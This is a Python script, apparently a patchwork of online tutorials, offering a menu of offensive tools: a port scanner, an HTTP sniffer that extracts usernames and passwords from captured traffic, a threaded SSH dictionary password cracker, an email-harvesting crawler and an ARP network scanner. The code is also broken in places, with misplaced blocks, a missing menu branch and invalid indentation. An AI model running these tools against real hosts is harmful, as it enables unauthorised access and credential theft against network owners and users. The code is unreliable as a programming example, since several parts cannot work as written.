#!usr/bin/env/python

import socket
import subprocess
import sys
import os
from datetime import datetime
import struct
import textwrap
import scapy.all as scapy
import argparse
from scapy.layers import http
import threading
from threading import Thread
import time
from bs4 import BeautifulSoup
import requests
import requests.exceptions
import urllib3
from urllib.parse import urlsplit
from collections import deque
import re
import argparse
from pexpect import pxssh
import nmap
import psutil
import prettytable
from prettytable import PrettyTable
from prettytable import MSWORD_FRIENDLY



os.system("clear")
print("Tool started")
print('\n')

print(" 1. Port Scanning ")
print(" 2. Network Sniffer ")
print(" 3. Password cracking ")
print(" 4. Email/Phone/Banner")
print(" 5. Vunerability Scanner")
print(" 6. Running Service ")

op = input("Choose your desired Option : ")


if op == "1" :
    subprocess.call('clear', shell=True)
    remoteServer    = input("Enter a remote host to scan: ")
    remoteServerIP  = socket.gethostbyname(remoteServer)
    print ("-" * 60)
    print ("Please wait, scanning remote host", remoteServerIP)
    print ("-" * 60)

    t1 = datetime.now()     
    try:
        x= PrettyTable(["Open ports"])
        for port in range(21,500):  
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                 x.add_row([port])
            sock.close()
        print (x.get_string()) 
   
    except KeyboardInterrupt:
        print ("You pressed Ctrl+C")
        sys.exit()

    except socket.gaierror:
        print ('Hostname could not be resolved. Exiting')
        sys.exit()

    except socket.error:
        print ("Couldn't connect to server")
        sys.exit()
    t2 = datetime.now()
    total =  t2 - t1
    print ('Scanning Completed in: ', total)
    

# reference to this code "https://www.thepythoncode.com/article/sniff-http-packets-scapy-python

    def sniff(iface):
        scapy.sniff(iface=iface, store=False, prn=process_packet)
        
    def process_packet(packet):
        if packet.haslayer(http.HTTPRequest):
            print("[+] Http Request >> " + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load
                keys = ["username", "password", "pass", "email"]
                y= PrettyTable()
                y.field_names = ["Possible password/username"]  
                for key in keys:
                    if key in load:
                        y.add_row([load])
                        break
                        print (y)               

    iface= "en0" #for MAC user
    #iface="wlan0" #for Windows user
    sniff(iface)



    # Reference for nmap "https://xael.org/pages/python-nmap-en.html"

elif op == "3" :
    Found = False
    Fails = 0

    maxConnections = 5
    connection_lock = threading.BoundedSemaphore(maxConnections)

    def nmapScan(tgtHost):
            nmapScan = nmap.PortScanner()
            nmapScan.scan(tgtHost, '22')
            state = nmapScan[tgtHost]['tcp'][22]['state']
            return state

    def connect(host, user, password, release):
            global Found
            global Fails
            try:
                    s = pxssh.pxssh()
                    s.login(host, user, password)
                    print('\n===========================================================')
                    print('\n[+] Password Found: {}\n'.format(password.decode('utf-8')))
                    print('===========================================================\n')
                    Found = True
                    s.logout()
            except Exception as e:
                    if 'read_nonblocking' in str(e):
                            Fails += 1
                            time.sleep(5)
                            connect(host, user, password, False)
                    elif 'synchronize with original prompt' in str(e):
                            time.sleep(1)
                            connect(host, user, password, False)
            finally:
                    if release: 
                            connection_lock.release()

    def main():
            parser = argparse.ArgumentParser('SSH Dictionary Based Attack')
            parser.add_argument('host', type=str, help='Host IP address for the SSH server')
            parser.add_argument('user', type=str, help='Username for the SSH connection')
            parser.add_argument('passwordFile', type=str, help='Password file to be used as the dictionary')
            args = parser.parse_args()
            host = args.host
            user = args.user
            passwordFile = args.passwordFile

            global Found
            global Fails

            print('\n========================================')
            print('Welcome to SSH Dictionary Based Attack')
            print('========================================\n')
            
            print('[+] Checking SSH port state on {}'.format(host))
            if nmapScan(host) == 'open':
                    print('[+] SSH port 22 open on {}'.format(host))
            else:
                    print('[!] SSH port 22 closed on {}'.format(host))	
                    print('[+] Exiting Application.\n')
                    exit()

            print('[+] Loading Password File\n')
            
            try:
                    fn = open(passwordFile, 'rb')
            except Exception as e:
                    print(e)
                    exit(1)
            
            for line in fn:
                    if Found:
                            # print('[*] Exiting Password Found')
                            exit(0)
                    elif Fails > 5:
                            print('[!] Exiting: Too Many Socket Timeouts')
                            exit(0)

                    connection_lock.acquire()
                    
                    password = line.strip()
                    print('[-] Testing Password With: {}'.format(password.decode('utf-8')))
                    
                    t = Thread(target=connect, args=(host, user, password, True))
                    t.start()
            
            while (threading.active_count() > 1):
                    if threading.active_count() == 1 and Found != True:
                            print('\n===========================================')
                            print('\nPassword Not Found In Password File.\n')
                            print('===========================================\n')
                            print('[*] Exiting Application')
                            exit(0)
                    elif threading.active_count() == 1 and Found == True:
                            print('[*] Exiting Application.\n')

    if __name__ == '__main__':
            main()


        #reference from https://www.pyimagesearch.com/2015/10/12/scraping-images-with-python-and-scrapy/
elif op == "4" :
    new_urls= 'https://www.google.ca'
    processed_urls = set()
    emails = set()
    while len(new_urls):
        url=new_urls
        processed_urls.add(url)
        z=PrettyTable()
        z.field_names = ["URLs", "email"]
        parts = urlsplit(url)
        base_url = "{0.scheme}://{0.netloc}".format(parts)
        path = url[:url.rfind('/')+1] if '/' in parts.path else url

        
        print("Processing %s" % url)
        try:
            response = requests.get(url)
        except (requests.exceptions.MissingSchema, requests.exceptions.ConnectionError):
            continue

        new_emails = set(re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+", response.text, re.I))
        emails.update(new_emails)

        soup = BeautifulSoup(response.text, 'html.parser')
        
        for anchor in soup.find_all("a"):
            link = anchor.attrs["href"] if "href" in anchor.attrs else ''
            if link.startswith('/'):
                link = base_url + link
            elif not link.startswith('http'):
                link = path + link
            if not link in new_urls and not link in processed_urls:
                z.add_row(link)
        z.print()


        #reference 'https://www.programcreek.com/python/example/103599/scapy.all.ARP'
elif op == "5" :
    def get_arguments():
        parser = argparse.ArgumentParser()
        parser.add_argument("-t", "--target", dest="target", help="Sepcify target ip or ip range")
        options = parser.parse_args()
        return  options

    def scan(ip):
        arp_packet = scapy.ARP(pdst=ip)
        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_broadcast_packet = broadcast_packet/arp_packet
        answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
        client_list = []

        for element in answered_list:
            client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
            client_list.append(client_dict)

        return client_list

    def print_result(scan_list):
        print("IP\t\t\tMAC\n----------------------------------------")
        for client in scan_list:
            print(client["ip"] + "\t\t" + client["mac"])

    x=PrettyTable(['Possible Vulnerabilites'])
    
    options = get_arguments()
    result_list = scan(options.target)
    x.add_row(result_list)
    print(x)
 

#reference 'https://thispointer.com/python-get-list-of-all-running-processes-and-sort-by-highest-memory-usage/'
elif op == "6" :
for proc in psutil.process_iter():
    try:
        processName = proc.name()
        processID = proc.pid
        z=PrettyTable()
        z.field_names = ["processName", "processID"]
        z.add_row(processName,processID)
        print(z)
    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        pass
    
else :
   print(" Enter a valid option... ")
